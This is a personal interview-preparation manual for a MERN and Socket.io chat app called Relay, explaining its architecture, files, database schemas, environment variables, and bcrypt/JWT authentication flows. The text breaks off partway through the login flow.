# Relay — Complete Interview Preparation Manual

> **Private document — keep local. Do not push to GitHub.**
> This file is listed in `.gitignore`.

---

## Quick Navigation

| Section | Topic |
|---------|-------|
| 1 | Project Overview |
| 2 | Architecture |
| 3 | Repository Walkthrough |
| 4 | Node.js Deep Dive |
| 5 | Express.js Deep Dive |
| 6 | Server Startup Sequence |
| 7 | Environment Variables |
| 8 | MongoDB Deep Dive |
| 9 | Mongoose Deep Dive |
| 10 | Database Schema Deep Dive |
| 11 | Authentication Deep Dive |
| 12 | JWT Deep Dive |
| 13 | Authorization |
| 14 | REST API Reference |
| 15 | HTTP Deep Dive |
| 16 | Socket.io Deep Dive |
| 17 | Exact Message Flow |
| 18 | Socket.io Rooms |
| 19 | Real-Time Architecture |
| 20 | React Deep Dive |
| 21 | Component-by-Component |
| 22 | React State Management |
| 23 | API Communication |
| 24 | Frontend Authentication Flow |
| 25 | CORS |
| 26 | Vite |
| 27 | package.json Dependencies |
| 28 | Error Handling |
| 29 | Security Analysis |
| 30 | Private Room Security |
| 31 | Concurrency & Consistency |
| 32 | Performance |
| 33 | Scalability |
| 34 | System Design Questions |
| 35 | DSA Connections |
| 36 | OOP & Software Engineering |
| 37 | Git & Project Management |
| 38 | Deployment |
| 39 | Testing |
| 40 | Debugging Scenarios |
| 41 | Code-Level Questions |
| 42 | Line-by-Line Walkthrough |
| 43 | "Why This Technology?" |
| 44 | Tradeoffs |
| 45 | Weaknesses |
| 46 | Improvements Made |
| 47 | Cloned Project / Ownership |
| 48 | Project Walkthrough Answers |
| 49 | Rapid-Fire Questions |
| 50 | Difficulty Levels |
| 51 | Interviewer Cross-Examination |
| 52 | Complexity Analysis |
| 53 | Production Readiness |
| 54 | Questions to Ask Interviewer |
| 55 | Final Revision Sheet |

---

# 1. Project Overview

## Relay

### One-line description

Relay is a full-stack real-time web chat application built with the MERN stack (MongoDB, Express, React, Node.js) and Socket.io, enabling users to register, authenticate with JWT, create and join public or private chat rooms, exchange persistent real-time messages with reactions and typing indicators, and see live presence of other members.

### What problem does Relay solve?

Teams and communities need a fast, browser-based communication channel that is:
- **Real-time** — messages appear instantly without page reload.
- **Persistent** — conversation history is stored and retrievable.
- **Organized** — conversations are divided into topic-specific rooms.
- **Secure** — only authenticated users can communicate, and private rooms are access-key protected.
- **Presence-aware** — users can see who else is currently online in a room.

### Main features (all confirmed in codebase)

- User registration with username + email + password
- Login with username or email
- JWT-based stateless authentication with 7-day expiry
- Password hashing with bcrypt (cost factor 10)
- Create public rooms
- Create private rooms with a bcrypt-hashed access key
- Join public rooms instantly
- Join private rooms by providing the correct access key
- Leave rooms explicitly
- Real-time messaging via Socket.io WebSocket
- Message persistence in MongoDB
- Last-50 message history loaded on room join
- Cursor-based pagination for older messages (timestamp-based)
- Online/offline presence tracking per room
- Typing indicators (multi-user support)
- Message reactions (emoji, toggle, change)
- System messages (join/leave events)
- Light mode / dark mode with localStorage persistence and system-preference detection
- Mobile-responsive sidebar
- RESTful API for non-realtime operations
- CORS-protected backend with explicit allow-list

### Technology stack

| Layer | Technology | Why it is used |
|-------|-----------|----------------|
| Frontend framework | React 18 | Component model, virtual DOM, Context API for shared state |
| Frontend routing | React Router DOM v6 | Client-side SPA routing with protected routes |
| Frontend build tool | Vite 5 | Extremely fast HMR in development, optimized production bundles |
| HTTP client | Axios | Interceptors for automatic Authorization header injection |
| Real-time client | socket.io-client 4.7 | Matches server library version, handles reconnection, rooms |
| Backend runtime | Node.js | Non-blocking I/O ideal for many concurrent WebSocket connections |
| Backend framework | Express 4 | Lightweight, middleware-based HTTP server with minimal ceremony |
| Database | MongoDB Atlas | Schema-flexible documents, horizontal scaling, JSON-native |
| ODM | Mongoose 8 | Schema validation, typed models, population, query builder |
| Real-time server | Socket.io 4.7 | Rooms, events, fallback transports, CORS handling |
| Authentication | JWT (jsonwebtoken 9) | Stateless, self-contained token — no server-side session store |
| Password security | bcryptjs 2.4 | Adaptive cost-factor hash + salt, resistant to rainbow tables |
| Environment config | dotenv 16 | Keeps secrets out of source code |
| Styling | Vanilla CSS (custom design system) | Full control, no runtime overhead, CSS custom properties for theming |
| Dev tool | nodemon | Auto-restarts backend on file change |

---

# 2. Architecture

## ASCII Architecture Diagram

```
  Browser
  ┌─────────────────────────────────────────────────────────────┐
  │                  React SPA (port 3000)                      │
  │                                                             │
  │  AuthContext ──── SocketContext ──── Route Components       │
  │       │                │                                    │
  │  localStorage       socket.io-client                        │
  │  (JWT token)        (WebSocket)                             │
  └───────────┬────────────────────────────────────────┬────────┘
              │                                        │
              │  HTTP/REST (via Vite proxy)             │  WebSocket
              │  Axios + Bearer token                  │  socket.io
              │                                        │
  ┌───────────▼────────────────────────────────────────▼────────┐
  │                  Express + Socket.io Server                  │
  │                     (port 5080)                              │
  │                                                              │
  │  ┌──────────────┐    ┌──────────────┐    ┌───────────────┐  │
  │  │  CORS        │    │  Auth        │    │  Socket.io    │  │
  │  │  Middleware  │    │  Middleware  │    │  Handler      │  │
  │  └──────────────┘    └──────────────┘    └───────────────┘  │
  │                                                              │
  │  ┌──────────────┐    ┌──────────────┐                       │
  │  │ /api/auth    │    │ /api/rooms   │                       │
  │  │  register    │    │  CRUD +      │                       │
  │  │  login       │    │  join/leave  │                       │
  │  │  verify      │    │  messages    │                       │
  │  └──────────────┘    └──────────────┘                       │
  └───────────────────────────────────┬─────────────────────────┘
                                      │
                             Mongoose ODM
                                      │
  ┌───────────────────────────────────▼─────────────────────────┐
  │                    MongoDB Atlas                             │
  │                                                              │
  │   Collection: users      Collection: rooms                   │
  │   ┌──────────────┐       ┌──────────────┐                   │
  │   │ _id          │       │ _id          │                   │
  │   │ username     │       │ name         │                   │
  │   │ email        │       │ description  │                   │
  │   │ password     │       │ createdBy    │                   │
  │   │ createdAt    │       │ members[]    │                   │
  │   └──────────────┘       │ isPrivate    │                   │
  │                          │ accessKey    │                   │
  │   Collection: messages   └──────────────┘                   │
  │   ┌──────────────┐                                          │
  │   │ _id          │                                          │
  │   │ room (ref)   │                                          │
  │   │ sender (ref) │                                          │
  │   │ senderUsern..|                                          │
  │   │ content      │                                          │
  │   │ messageType  │                                          │
  │   │ reactions[]  │                                          │
  │   │ timestamp    │                                          │
  │   └──────────────┘                                          │
  └─────────────────────────────────────────────────────────────┘
```

## Connection explanations

**Browser → Vite dev server (port 3000)**
The browser loads the React SPA from the Vite dev server. All UI interactions happen within this SPA.

**React SPA → Express backend (HTTP REST)**
When React needs to create a room, log in, register, join/leave a room, or fetch message history, it uses Axios to send HTTP requests. Because the frontend runs on port 3000 and the backend on port 5080, Vite proxies `/api` and `/socket.io` requests to `http://localhost:5080` to avoid CORS preflight issues during development.

**React SPA → Socket.io server (WebSocket)**
After login, `SocketContext` connects a Socket.io client to the backend. This persistent bidirectional connection handles real-time messages, typing events, presence updates, and reaction updates. The connection lives for the entire session.

**Express → MongoDB Atlas**
Mongoose maintains a connection pool to MongoDB Atlas. When routes or socket handlers need to read or write data, they use Mongoose models which translate to MongoDB operations over this connection.

**Authentication flow**
REST is used for login/register. The backend creates a JWT which the frontend stores in localStorage. Every subsequent REST request includes that JWT in the `Authorization: Bearer <token>` header. The auth middleware verifies it on protected routes.

---

# 3. Repository Walkthrough

## Root

```
TalkHub-main/
├── .gitignore              — Tells Git which files to ignore (node_modules, .env, etc.)
├── .gitattributes          — Controls line endings across platforms
├── README.md               — Original project README
├── chat-app-backend/       — Node.js + Express + Socket.io backend
├── chat-app-frontend/      — React + Vite frontend
└── mobile/                 — React Native mobile app (NOT touched by our work)
```

## Backend

```
chat-app-backend/
├── server.js               — Entry point: Express setup, middleware, routes, DB connection, Socket.io
├── .env                    — Real credentials (git-ignored)
├── .env.example            — Placeholder template for new developers
├── package.json            — Dependencies and npm scripts
├── middleware/
│   └── auth.js             — JWT verification middleware for protected routes
├── models/
│   ├── User.js             — Mongoose User schema + model
│   ├── Room.js             — Mongoose Room schema + model
│   └── Message.js          — Mongoose Message schema + model + index
├── routes/
│   ├── auth.js             — /api/auth: register, login, verify
│   └── rooms.js            — /api/rooms: CRUD, join, leave, messages
└── socket/
    └── socketHandler.js    — All Socket.io event handlers
```

### `server.js`
- **What**: Application entry point
- **Why**: Bootstraps everything — Express, CORS, Socket.io, DB, middleware, routes
- **Exports**: Nothing (side-effect module that starts the HTTP server)
- **Depends on**: dotenv, express, http, socket.io, mongoose, cors, all routes, socketHandler
- **On run**: Validates env vars → creates Express app → configures CORS → creates HTTP server → attaches Socket.io → connects to MongoDB → registers routes → starts listening on PORT

### `middleware/auth.js`
- **What**: Express middleware function
- **Why**: Protects private routes — verifies JWT and attaches the decoded user payload to `req.user`
- **Exports**: `function(req, res, next)`
- **Who imports it**: `routes/auth.js` (for `/verify`), `routes/rooms.js` (all routes)
- **On run**: Reads `Authorization` header → extracts Bearer token → calls `jwt.verify()` → if valid, sets `req.user` and calls `next()` → if invalid, returns 401

### `models/User.js`
- **What**: Mongoose schema and model for users
- **Exports**: `mongoose.model('User', UserSchema)`
- **Fields**: `username`, `email`, `password`, `createdAt`

### `models/Room.js`
- **What**: Mongoose schema and model for chat rooms
- **Exports**: `mongoose.model('Room', RoomSchema)`
- **Fields**: `name`, `description`, `createdBy`, `members[]`, `isPrivate`, `accessKey`, `createdAt`

### `models/Message.js`
- **What**: Mongoose schema and model for messages
- **Exports**: `mongoose.model('Message', MessageSchema)`
- **Fields**: `room`, `sender`, `senderUsername`, `content`, `messageType`, `reactions[]`, `timestamp`
- **Index**: `{ room: 1, timestamp: -1 }` — optimizes queries for fetching a room's messages sorted by time

### `routes/auth.js`
- **What**: Express Router with 3 auth endpoints
- **Exports**: Express Router
- **Routes**: POST `/register`, POST `/login`, GET `/verify`

### `routes/rooms.js`
- **What**: Express Router with 6 room endpoints
- **Exports**: Express Router
- **Routes**: POST `/`, GET `/`, GET `/:id`, POST `/:id/join`, POST `/:id/leave`, GET `/:id/messages`

### `socket/socketHandler.js`
- **What**: All Socket.io event handlers — the real-time brain of the application
- **Why**: Separates Socket.io logic from Express HTTP logic for maintainability
- **Exports**: `function(io)` — called once in `server.js`
- **Module-level state**: `activeRoomUsers` object — in-memory map of `{ roomId: [{socketId, userId, username}] }`
- **Events handled**: `joinRoom`, `chatMessage`, `typing`, `messageReaction`, `leaveRoom`, `disconnect`

## Frontend

```
chat-app-frontend/
├── index.html              — HTML shell, loads Inter font, sets <div id="root">
├── vite.config.js          — Vite config with proxy rules for /api and /socket.io
├── package.json            — Frontend dependencies
├── .env                    — VITE_API_URL (git-ignored)
├── .env.example            — Placeholder for new developers
└── src/
    ├── index.jsx           — ReactDOM.createRoot, renders <App> in StrictMode
    ├── App.jsx             — Theme bootstrap, route guards (ProtectedRoute/PublicRoute), BrowserRouter
    ├── styles/
    │   └── app.css         — Complete design system: CSS variables, light/dark theme, all component styles
    ├── context/
    │   ├── AuthContext.jsx — Authentication state: user, loading, login(), register(), logout()
    │   └── SocketContext.jsx — Socket.io connection lifecycle tied to auth state
    ├── utils/
    │   └── api.js          — Axios instance with baseURL and Bearer token interceptor
    └── components/
        ├── Auth/
        │   ├── Login.jsx        — Two-panel login page
        │   └── Register.jsx     — Two-panel register page
        ├── Chat/
        │   ├── ChatRoom.jsx     — Main workspace: navbar, sidebar toggle, chat area, join/leave flow
        │   ├── MessageList.jsx  — Renders list of messages + system messages + load older button
        │   ├── Message.jsx      — Single message bubble with avatar, reactions, reaction picker
        │   ├── MessageInput.jsx — Textarea + send button + typing event emission
        │   ├── TypingIndicator.jsx — Shows who is currently typing
        │   ├── Avatar.jsx       — Username-derived colored circle avatar
        │   └── ConfirmModal.jsx — Reusable confirmation dialog (used for Leave room)
        └── Sidebar/
            ├── RoomList.jsx    — Searchable list of rooms in the sidebar
            ├── CreateRoom.jsx  — Modal form for creating a new room
            └── OnlineUsers.jsx — Right panel showing members online in current room
```

### `src/index.jsx`
React entry point. Creates the React root and renders `<App>` wrapped in `React.StrictMode`. StrictMode invokes effects twice in development to surface side-effect bugs.

### `src/App.jsx`
- Bootstraps the theme: reads `localStorage.getItem('relay-theme')` or `prefers-color-scheme` and sets `document.documentElement.setAttribute('data-theme', ...)` before first render.
- Provides `AuthProvider` and `SocketProvider` wrappers.
- Defines `ProtectedRoute` (redirects to `/login` if not authenticated) and `PublicRoute` (redirects to `/chat` if already authenticated).
- Declares the four routes: `/login`, `/register`, `/chat`, and a wildcard catch-all that redirects to `/chat`.

### `src/context/AuthContext.jsx`
- On mount: reads `token` from localStorage, calls `GET /api/auth/verify` to validate it, and sets the `user` state.
- Exposes: `user`, `loading`, `error`, `login()`, `register()`, `logout()`, `isAuthenticated`
- `login()`: POST `/api/auth/login` → stores token in localStorage → sets user state
- `register()`: POST `/api/auth/register` → stores token in localStorage → sets user state
- `logout()`: removes token from localStorage, sets user to null

### `src/context/SocketContext.jsx`
- Watches `user` from `AuthContext`
- When `user` becomes non-null: creates a socket.io connection to `VITE_APP_SOCKET_URL || window.location.origin`
- When `user` becomes null: disconnects the socket
- Exposes: `socket`, `isConnected`

### `src/utils/api.js`
- Axios instance with `baseURL: import.meta.env.VITE_API_URL || ''`
- Request interceptor: reads `localStorage.getItem('token')` and adds `Authorization: Bearer <token>` header

---

# 4. Node.js Deep Dive

## What Node.js is

Node.js is a JavaScript runtime built on Chrome's V8 engine. It executes JavaScript outside the browser on a server. What makes it special is its **event-driven, non-blocking I/O model**.

## Why it suits Relay

Relay is I/O-bound, not CPU-bound. It spends most of its time:
- Waiting for MongoDB to respond
- Waiting for WebSocket events
- Waiting for HTTP requests

Node.js handles these waits efficiently because it does not block a thread waiting for I/O. It registers a callback and immediately moves on to handle other requests.

## Event loop explained (for interviews)

```
 ┌──────────────────────┐
 │      Call Stack       │  Executes JavaScript synchronously
 └──────────┬───────────┘
            │ empty?
 ┌──────────▼───────────┐
 │   Microtask Queue     │  Promises (.then), queueMicrotask
 │   (runs first)        │
 └──────────┬───────────┘
            │ empty?
 ┌──────────▼───────────┐
 │   Macrotask Queue     │  setTimeout, setInterval, I/O callbacks
 └──────────────────────┘
```

When you write `await Message.find(...)`, Node:
1. Starts the MongoDB query (registers callback internally with libuv)
2. Returns to the event loop
3. Handles other requests
4. When MongoDB responds, the callback is queued
5. When the call stack empties, the callback runs and execution resumes

## async/await in Relay

Every route handler and socket handler uses `async/await`. Example from `routes/rooms.js`:

```js
router.post('/', auth, async (req, res) => {
  const newRoom = new Room({ ... });
  await newRoom.save();      // suspends here, Node handles other requests
  res.status(201).json(newRoom);
});
```

Without `async/await`, you'd use nested callbacks (callback hell) or raw Promises.

## What Node is NOT good at

- CPU-intensive computation (image processing, cryptography in a tight loop, video encoding)
- Long-running synchronous tasks that block the event loop
- **Interview answer**: "Relay doesn't need heavy CPU work, so Node is a perfect fit."

---

# 5. Express.js Deep Dive

## What Express is

Express is a minimal, unopinionated web framework for Node.js. It adds:
- Routing (match URL + HTTP method to a function)
- Middleware chain (functions that process requests before route handlers)
- `req`/`res` helper methods

## Actual Express setup in `server.js`

```js
const app = express();
const server = http.createServer(app);
```

An `http.Server` is created from the Express app. This is necessary because Socket.io attaches to the raw `http.Server`, not to the Express app directly.

## Middleware chain in Relay (in execution order)

### 1. `cors()` middleware

```js
app.use(cors({ origin: corsOriginHandler, credentials: true }));
```

**What**: Sets `Access-Control-Allow-Origin` headers on responses.
**Why**: Browsers block cross-origin requests by default. The frontend on port 3000 calling the backend on port 5080 is a cross-origin request.
**When**: Every incoming request goes through this before routing.
**If removed**: All browser API calls will fail with "CORS error" in the console.

### 2. `express.json()` middleware

```js
app.use(express.json());
```

**What**: Parses the request body from JSON string into a JavaScript object available as `req.body`.
**Why**: Without it, `req.body` is `undefined` — login, register, and room creation would all fail.
**If removed**: All POST routes that read `req.body` would break silently.

### 3. `req.io` injection middleware

```js
app.use((req, res, next) => {
  req.io = io;
  next();
});
```

**What**: Attaches the Socket.io `io` instance to every request.
**Why**: Route handlers (`rooms.js`) need to broadcast socket events (e.g., `roomCreated`) without importing `io` directly. By attaching it to `req`, they can access it via `req.io.emit(...)`.

### 4. `auth.js` middleware (used per-route, not global)

```js
router.post('/', auth, async (req, res) => { ... });
```

**What**: Verifies the JWT in the `Authorization` header.
**Why**: Protects routes so only authenticated users can create rooms, send messages, etc.
**When**: Runs only on routes where it is explicitly included.

## req, res, next

- `req` — incoming request (url, headers, body, params, query)
- `res` — outgoing response (status, json, send)
- `next` — calls the next middleware in the chain. If not called, the request hangs.

## Error handling middleware

```js
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ message: 'Something went wrong on the server!' });
});
```

Express identifies this as an error handler because it has 4 arguments (err, req, res, next). When any route/middleware calls `next(err)` or throws synchronously, this catches it.

---

# 6. Server Startup Sequence

When you run `npm start` in `chat-app-backend/`:

```
node server.js
       ↓
require('dotenv').config()
  → Reads .env, sets process.env.PORT, MONGO_URI, JWT_SECRET, CLIENT_URL
       ↓
Startup validation
  → Checks for MONGO_URI and JWT_SECRET
  → If missing: console.error + process.exit(1)
       ↓
CORS allow-list built
  → CLIENT_URL.split(',') or localhost defaults in dev
       ↓
const app = express()         — Express application created
const server = http.createServer(app)  — Raw HTTP server wrapping Express
       ↓
const io = socketIo(server, { cors: ... })  — Socket.io attached to HTTP server
       ↓
app.use(cors(...))            — CORS middleware registered
app.use(express.json())       — JSON body parser registered
       ↓
mongoose.connect(process.env.MONGO_URI)
  → Asynchronous — does NOT block startup
  → .then() logs "MongoDB connected"
  → .catch() logs error and calls process.exit(1)
       ↓
app.use((req,res,next) => { req.io = io; next(); })  — Socket injection
       ↓
app.use('/api/auth', require('./routes/auth'))
app.use('/api/rooms', require('./routes/rooms'))
       ↓
app.get('/')                  — Health check route
       ↓
require('./socket/socketHandler')(io)
  → Registers all socket event listeners
       ↓
app.use(errorHandler)         — Global error middleware
       ↓
server.listen(PORT)
  → Console: "Server is running on port 5080"
  → Console: "Allowed CORS origins: http://localhost:3000"
  → Server now accepts HTTP and WebSocket connections
```

---

# 7. Environment Variables

### `PORT=5080`
- **Purpose**: Port the HTTP server listens on
- **Read in**: `server.js` line `const PORT = process.env.PORT || 5000`
- **Why not hardcoded**: Different environments (dev, staging, production) need different ports
- **If missing**: Falls back to 5000 (the only variable with a safe fallback)

### `MONGO_URI=mongodb+srv://...`
- **Purpose**: Full MongoDB Atlas connection string including credentials, cluster URL, and database name
- **Read in**: `server.js` — `mongoose.connect(process.env.MONGO_URI)`
- **Why not hardcoded**: Contains database username and password — would expose credentials in source control
- **If missing**: Server exits immediately with `[FATAL] Missing required environment variables: MONGO_URI`
- **Security**: The Atlas connection string contains the password. If committed to GitHub, anyone can read and connect to your database.

### `JWT_SECRET=<64-char hex string>`
- **Purpose**: Secret key used to sign and verify JWTs
- **Read in**: `routes/auth.js` (signing), `middleware/auth.js` (verification)
- **Why not hardcoded**: If the secret is in source code, anyone who can see the code can forge tokens and authenticate as any user
- **If missing**: `middleware/auth.js` calls `process.exit(1)` on module load — server refuses to start
- **Production**: Should be at least 256 bits of cryptographically random entropy

### `CLIENT_URL=http://localhost:3000`
- **Purpose**: The allowed frontend origin for CORS
- **Read in**: `server.js` — `corsOriginHandler`
- **If missing in production**: CORS allow-list becomes empty — all browser requests are blocked
- **Production value**: Your deployed frontend URL (e.g., `https://relay.yourdomain.com`)

### Why `.env` must never be committed

If `.env` is in a public GitHub repository:
- Database credentials are exposed → attacker can read/delete all user data
- JWT secret is exposed → attacker can forge tokens for any user ID and bypass authentication entirely
- The breach is permanent — even if you delete the commit, it exists in Git history

---

# 8. MongoDB Deep Dive

## What MongoDB is

MongoDB is a **document-oriented NoSQL database**. Instead of rows in tables, it stores **BSON documents** (Binary JSON) inside **collections**.

```
MongoDB Instance (Atlas cluster)
└── Database: relay (or unnamed default in current connection)
    ├── Collection: users
    │   └── Document: { _id: ObjectId, username: "alice", email: "...", password: "..." }
    ├── Collection: rooms
    │   └── Document: { _id: ObjectId, name: "general", members: [ObjectId, ObjectId], ... }
    └── Collection: messages
        └── Document: { _id: ObjectId, room: ObjectId, sender: ObjectId, content: "Hello", ... }
```

## Why MongoDB for Relay

1. **Schema flexibility**: Room descriptions can be empty or long. Message content varies. No need to alter table schemas as the app evolves.
2. **JSON-native**: Messages are naturally JSON objects. MongoDB stores them as BSON — minimal transformation.
3. **Horizontal scaling**: MongoDB Atlas supports sharding for high-volume writes (many concurrent messages).
4. **Atlas managed service**: No infrastructure management — backups, replication, and scaling are handled.
5. **Embedded documents**: Reactions are stored as an array inside each message document — a natural fit for document storage.

## BSON and ObjectId

BSON (Binary JSON) is MongoDB's internal serialization format. It adds types that JSON lacks:
- `Date` type
- `ObjectId` — a 12-byte unique identifier generated automatically as `_id`

An ObjectId encodes:
- 4-byte Unix timestamp (seconds)
- 5-byte random value (unique to machine+process)
- 3-byte incrementing counter

This means ObjectIds are:
- Globally unique across all MongoDB instances
- Sortable by creation time (roughly)

## Embedding vs referencing (as used in Relay)

**Embedded** (in Relay):
- `reactions` inside `Message` — each reaction `{ username, reaction }` lives inside the message document
- `members[]` inside `Room` — array of User ObjectIds
- **Why**: Reactions and members are fetched together with their parent document, reducing query count

**Referenced** (in Relay):
- `Message.room` references `Room._id`
- `Message.sender` references `User._id`
- `Room.createdBy` references `User._id`
- **Why**: Messages are independent documents queried by room — embedding them inside Room would create massive documents

## MongoDB Atlas

MongoDB Atlas is the cloud-hosted MongoDB service. The connection string:

```
mongodb+srv://username:password@cluster.mongodb.net/
```

- `+srv`: Uses DNS-based service discovery (gets replica set members automatically)
- `username:password`: Atlas database user credentials
- `@cluster.mongodb.net`: Atlas cluster hostname
- The database name can be appended after the slash

## Connection lifecycle

When `mongoose.connect(MONGO_URI)` is called:
1. Mongoose creates a connection pool (default: 5 connections)
2. Each pool connection stays open — subsequent queries reuse them
3. If MongoDB is unavailable, Mongoose retries with backoff
4. `mongoose.connect()` returns a Promise — Relay uses `.then()` and `.catch()`

## Actual queries used in Relay

```js
// Find one user by email or username
User.findOne({ $or: [{ email: ... }, { username: ... }] })

// Find all rooms sorted newest first
Room.find().populate('createdBy', 'username email').sort({ createdAt: -1 })

// Find single room with populated references
Room.findById(id).populate('createdBy', ...).populate('members', 'username')

// Message history with cursor pagination
Message.find({ room: roomId, timestamp: { $lt: new Date(before) } })
       .sort({ timestamp: -1 }).limit(50)

// Find and modify a message's reactions
Message.findById(messageId)
message.reactions.push/splice(...)
message.save()

// Create and save new documents
const user = new User({ ... });
await user.save();
```

---

# 9. Mongoose Deep Dive

## Schema

A schema defines the shape of a document:

```js
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  ...
});
```

Schema options in Relay:
- `required`: Field must be present — Mongoose throws a `ValidationError` if missing
- `unique`: Creates a MongoDB index for uniqueness — throws a duplicate key error on conflict
- `trim`: Removes leading/trailing whitespace before saving
- `lowercase`: Converts to lowercase before saving (`email` field)
- `default`: Value used if the field is not provided
- `minlength`: Validates minimum string length
- `enum`: Only allows values from a predefined list (`messageType`: 'text', 'image', 'file')
- `match`: Validates against a regex (`email` must match `/^\S+@\S+\.\S+$/`)

## Model

```js
module.exports = mongoose.model('Room', RoomSchema);
```

A Model is a class that lets you interact with a MongoDB collection. Mongoose automatically pluralizes: `'Room'` → `rooms` collection.

## Methods used in Relay

| Method | Example from Relay | What it does |
|--------|-------------------|-------------|
| `Model.findOne(query)` | `User.findOne({ email })` | Returns first matching document or null |
| `Model.findById(id)` | `Room.findById(req.params.id)` | Shorthand for `findOne({ _id: id })` |
| `Model.find(query)` | `Room.find().sort(...)` | Returns all matching documents as array |
| `new Model(data)` | `new Message({ ... })` | Creates a document instance (not yet saved) |
| `doc.save()` | `await newUser.save()` | Inserts (if new) or updates the document |
| `.populate(path, fields)` | `.populate('createdBy', 'username email')` | Replaces ObjectId references with the actual documents |
| `.sort(criteria)` | `.sort({ createdAt: -1 })` | Sorts result (-1 = descending) |
| `.limit(n)` | `.limit(50)` | Returns at most n documents |
| `.select(fields)` | `.select('-password')` | Includes or excludes specified fields |
| `doc.field = val; doc.save()` | Reaction update | Updates a field and persists the change |
| `array.push(item)` | `room.members.push(userId)` | Adds to an embedded array (saved on next `.save()`) |
| `array.filter(fn)` | `room.members.filter(...)` | Removes from embedded array (saved on next `.save()`) |
| `array.splice(i, 1)` | Reaction removal | Removes item at index from embedded array |
| `array.findIndex(fn)` | Reaction lookup | Finds index of a matching item |

## `.populate()` explained

Without populate:
```js
{ room: ObjectId("abc123"), sender: ObjectId("def456"), ... }
```

With `.populate('createdBy', 'username email')`:
```js
{ createdBy: { _id: ..., username: "alice", email: "alice@ex.com" }, ... }
```

Mongoose runs a second query: `User.find({ _id: { $in: [createdBy_ids] } })` and replaces the ObjectIds inline.

---

# 10. Database Schema Deep Dive

## User Schema

**File**: `chat-app-backend/models/User.js`

```
User
├── _id           ObjectId  Auto-generated unique identifier
├── username      String    Required, unique, trimmed, min 3 chars
├── email         String    Required, unique, trimmed, lowercase, regex validated
├── password      String    Required, min 6 chars — stored as bcrypt hash
└── createdAt     Date      Default: Date.now — when the account was created
```

**Why each field**:
- `username`: Display name in messages and UI
- `email`: Allows login by email as well as username
- `password`: bcrypt hash — never stored plaintext
- `createdAt`: Useful for analytics; could sort users by registration date

## Room Schema

**File**: `chat-app-backend/models/Room.js`

```
Room
├── _id           ObjectId    Auto-generated
├── name          String      Required, unique, trimmed, min 3 chars — the room identifier
├── description   String      Trimmed, default ''
├── createdBy     ObjectId    Ref: User — who created this room
├── members       [ObjectId]  Ref: User[] — users who have joined this room
├── isPrivate     Boolean     Default: false
├── accessKey     String      Default: '' — bcrypt hash if private, empty if public
└── createdAt     Date        Default: Date.now
```

**Why each field**:
- `name`: Unique identifier users use to find rooms
- `createdBy`: Attribution and could be used for admin controls
- `members[]`: Used to check membership before allowing message access
- `isPrivate + accessKey`: Controls access to private rooms
- `accessKey` stores a **bcrypt hash** (not plaintext) after our security improvement

## Message Schema

**File**: `chat-app-backend/models/Message.js`

```
Message
├── _id           ObjectId    Auto-generated
├── room          ObjectId    Ref: Room — which room this message belongs to
├── sender        ObjectId    Ref: User — who sent this message
├── senderUsername String    Denormalized — stored separately to avoid join on every display
├── content       String      Required, trimmed — the actual message text
├── messageType   String      Enum: 'text'|'image'|'file', default 'text'
├── reactions     [{           Array of reaction objects
│     username: String,
│     reaction: String        emoji character
│   }]
└── timestamp     Date        Default: Date.now

Index: { room: 1, timestamp: -1 }
```

**Why `senderUsername` is denormalized**: When loading 50 messages, joining each to the User collection for display would be expensive. Storing the username directly avoids that extra query. The tradeoff is that if a username changes, old messages show the old name — acceptable for this application.

**Why the compound index**: The most common query is "give me messages for room X sorted by time." The index `{ room: 1, timestamp: -1 }` covers this query exactly — MongoDB can use it without scanning the full collection.

## Entity relationships

```
User
 │
 ├──── creates ──────────────────> Room (createdBy = User._id)
 │
 ├──── joins/becomes member of ──> Room (members[] contains User._id)
 │
 └──── sends ──────────────────> Message (sender = User._id)

Room
 │
 └──── contains ──────────────> Messages (Message.room = Room._id)

Message
 │
 └──── has many ──────────────> Reactions (embedded array)
```

---

# 11. Authentication Deep Dive

## Registration Flow

**File**: `chat-app-backend/routes/auth.js` → `POST /api/auth/register`

```
User fills form (username, email, password)
           ↓
Login.jsx / Register.jsx — calls register() from AuthContext
           ↓
AuthContext.register() — calls api.post('/api/auth/register', { username, email, password })
           ↓
Axios sends HTTP POST with JSON body
           ↓
Vite proxy forwards to http://localhost:5080/api/auth/register
           ↓
Express CORS middleware — checks origin, allows localhost:3000
           ↓
express.json() — parses body into req.body
           ↓
Route handler begins
           ↓
Input validation:
  - All three fields present? → else 400 "Please enter all fields"
  - password.length >= 6? → else 400
           ↓
Duplicate check:
  - User.findOne({ email }) → if found → 400 "User with this email already exists"
  - User.findOne({ username }) → if found → 400 "Username is already taken"
           ↓
new User({ username, email: email.toLowerCase(), password })
           ↓
bcrypt.genSalt(10) — generates a 29-character salt with cost factor 10
bcrypt.hash(password, salt) — hashes password (takes ~100ms at cost 10)
newUser.password = hash
           ↓
await newUser.save() — MongoDB stores the user document
           ↓
jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' })
  payload = { id: newUser._id, username, email }
           ↓
Response 200: { token, user: { id, username, email } }
           ↓
AuthContext stores token in localStorage
AuthContext sets user state
           ↓
React Router navigates to /chat
```

## Password hashing with bcrypt

bcrypt is a password-hashing function designed to be **slow and resistant to brute force**.

```js
const salt = await bcrypt.genSalt(10);  // cost factor 10 → 2^10 = 1024 iterations
const hash = await bcrypt.hash(password, salt);
```

The hash output looks like:
```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
│   │  │                      │
│   │  │                      └── 31-char hash
│   │  └─── 22-char base64 salt
│   └─── cost factor (10)
└── bcrypt algorithm version
```

**Why bcrypt over SHA/MD5**:
- SHA/MD5 is fast — an attacker can compute billions of hashes per second with a GPU
- bcrypt is intentionally slow — cost factor 10 means ~100ms per hash, making brute force impractical
- The salt prevents rainbow table attacks — even identical passwords produce different hashes
- Adaptive cost factor — you can increase it as hardware gets faster

**Verification**:
```js
const isMatch = await bcrypt.compare(password, user.password);
// bcrypt extracts the salt from the stored hash, re-hashes the input, and compares
```

## Login Flow

**File**: `chat-app-backend/routes/auth.js` → `POST /api/auth/login`

```
User enters usernameOrEmail + password
           ↓
AuthContext.login() → api.post('/api/auth/login', { usernameOrEmail, password })
           ↓
Route handler begins
           ↓
Input validation: fields present?
           ↓
User.findOne({ $or: [{ email: input.toLowerCase() }, { username: input }] })
  → $or allows login by either email or username
  → if no user found → 400 "Invalid credentials" (intentionally vague)
           ↓
bcrypt.compare(password, user.password)
  → if no match → 400 "Invalid credentials"
           ↓
